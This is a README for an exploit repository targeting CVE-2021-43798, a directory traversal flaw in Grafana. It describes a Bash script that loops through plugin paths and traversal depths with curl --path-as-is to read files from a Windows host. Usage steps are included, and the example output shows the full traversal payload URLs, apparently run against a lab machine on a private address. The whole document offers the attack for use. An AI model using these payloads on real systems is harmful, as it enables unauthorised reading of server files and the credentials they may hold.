# Grafana Directory Traversal Exploit Script

This repository contains a Bash script designed to exploit the CVE-2021-43798 vulnerability in Grafana. The script systematically attempts directory traversal attacks to access sensitive files on a Windows server.

## Description

The script iterates through various plugin paths and traversal depths to locate the target file (`install.txt`) on a Windows server running Grafana. The directory traversal attack is performed using the `--path-as-is` parameter with `curl`.

## Usage

1. **Clone the Repository**

    ```bash
    git clone https://github.com/yourusername/grafana-exploit.git
    cd grafana-exploit
    ```

2. **Make the Script Executable**

    ```bash
    chmod +x grafana_traversal.sh
    ```

3. **Run the Script**

    ```bash
    ./grafana_traversal.sh
    ```

## Script Details

### Variables

- `base_url`: The base URL of the target Grafana instance.
- `target_file`: The target file path you want to access (`Users/install.txt`).
- `max_depth`: The maximum directory traversal depth to try (default is 15).
- `plugin_paths`: An array of plugin paths to test.

### Functions

- `build_traversal_path(depth)`: Constructs the traversal path based on the specified depth.

### Workflow

1. The script iterates over each plugin path and traversal depth.
2. It constructs the URL for each combination and makes a `curl` request using the `--path-as-is` parameter.
3. If the HTTP response code is 200, the script prints the content of the file and exits.
4. If all attempts fail, the script prints a failure message.

## Example Output

```bash
Trying path: http://192.168.248.193:3000/public/plugins/alertGroups/../../../../../../../../Users/install.txt
Failed with HTTP code 404
Trying path: http://192.168.248.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
Failed with HTTP code 404
...
Trying path: http://192.168.248.193:3000/public/plugins/zipkin/../../../../../../../../Users/install.txt
Success! Found the file at: http://192.168.248.193:3000/public/plugins/zipkin/../../../../../../../../Users/install.txt
File content:
<contents of install.txt>
